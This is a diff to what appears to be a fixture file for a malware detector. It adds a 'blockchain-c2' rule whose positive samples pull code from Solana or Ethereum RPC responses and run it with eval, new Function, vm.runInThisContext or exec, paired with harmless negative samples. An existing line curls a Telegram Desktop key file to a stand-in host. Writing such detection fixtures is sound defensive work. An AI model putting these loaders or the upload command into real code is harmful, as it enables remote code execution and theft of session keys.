@@ -56,5 +56,25 @@
         "curl -F \"file=@$HOME/.local/share/TelegramDesktop/tdata/key_datas\" https://x.example.invalid/u"
       ]
     ]
+  },
+  "network/blockchain-c2": {
+    "lang": "js",
+    "pos": [
+      "const conn = new Connection('https://api.mainnet-beta.solana.com');\nconst sigs = await conn.getSignaturesForAddress(owner);\nconst tx = await conn.getParsedTransaction(sigs[0].signature);\neval(atob(tx.meta.logMessages[0]));",
+      "const body = JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'eth_call', params: [{ to, data }, 'latest'] });\nconst res = await fetch(rpcUrl, { method: 'POST', body });\nconst code = decodeHex((await res.json()).result);\nnew Function(code)();",
+      "const p = new ethers.JsonRpcProvider(rpcUrl);\nconst src = await new ethers.Contract(addr, abi, p).get();\nvm.runInThisContext(src);"
+    ],
+    "neg": [
+      "async getRecent(connection, address) {\n  const sigs = await connection.getSignaturesForAddress(address, { limit: 10 });\n  return sigs.map((s) => s.signature);\n}",
+      "async call(tx) {\n  return this.send('eth_call', [tx, 'latest']);\n}\nconst HEX = /^0x[0-9a-f]+$/i;\nconst m = HEX.exec(value);",
+      "const g = new Function('return this')();\nconst provider = new JsonRpcProvider('https://rpc.example.invalid');",
+      "const result = eval(expression);"
+    ],
+    "also": [
+      [
+        "py",
+        "w3 = Web3(Web3.HTTPProvider('https://bsc-dataseed1.example.invalid'))\npayload = contract.functions.get().call()\nexec(payload)"
+      ]
+    ]
   }
 }
